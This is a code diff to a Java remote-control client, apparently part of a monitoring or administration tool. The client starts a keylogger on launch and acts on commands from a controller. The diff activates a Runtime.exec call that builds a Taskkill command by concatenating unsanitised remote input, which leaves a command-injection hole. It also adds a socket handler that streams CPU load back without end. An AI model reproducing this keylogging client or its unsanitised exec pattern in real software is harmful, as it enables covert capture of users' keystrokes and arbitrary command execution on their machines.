@@ -26,9 +26,10 @@ public class Client
     static SystemInfo si = new SystemInfo();
     public static String keyLoger;
     public static boolean isSTOP;
+    private static Socket sClient;
     public static void main(String[] args) throws IOException
     {
-        Scanner scn = new Scanner(System.in);
+
         keyLoger = "";
         KeyLogger.startKeyLoger();
         // getting localhost ip
@@ -74,7 +75,7 @@ public class Client
         {
             @Override
             public void run() {
-
+                Thread CPULOAD;
                 while (!Thread.currentThread().isInterrupted()) {
                     try {
                         // read the message sent to this client
@@ -105,7 +106,7 @@ public class Client
                             }
                             case Message.KILL_PROCESS -> {
                                 System.out.println("Taskkill /PID "+ msg.data +" /F");
-//                                Runtime.getRuntime().exec("Taskkill /PID "+ msg.data +" /F");
+                                Runtime.getRuntime().exec("Taskkill /PID "+ msg.data +" /F");
                             }
                             case Message.GET_DISK -> {
                                 object.data = FileStores.toJson();
@@ -149,6 +150,30 @@ public class Client
                                 os.setProc(OsHW.getProc(si));
                                 object.data = new Gson().toJson(os).replace("\n","");
                                 dos.writeObject(object);
+                            }
+                            case Message.OPEN_SOCKET_CPU -> {
+                                int port = Integer.parseInt(msg.data);
+                                InetAddress ip = InetAddress.getByName("localhost");
+                                sClient = new Socket(ip, port);
+                                ObjectOutputStream dos = new ObjectOutputStream(sClient.getOutputStream());
+                                ObjectInputStream dis = new ObjectInputStream(sClient.getInputStream());
+                                CPULOAD = new Thread(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        while(!Thread.currentThread().isInterrupted()) {
+                                            Message cpuload = new Message();
+                                            cpuload.command = 0;
+                                            cpuload.toId = "";
+                                            cpuload.data = String.valueOf(Processor.getCpuPercent());
+                                            try {
+                                                dos.writeObject(cpuload);
+                                            } catch (IOException e) {
+                                                Thread.currentThread().interrupt();
+                                            }
+                                        }
+                                    }
+                                });
+                                CPULOAD.start();
                             }
                             default -> {
                             }
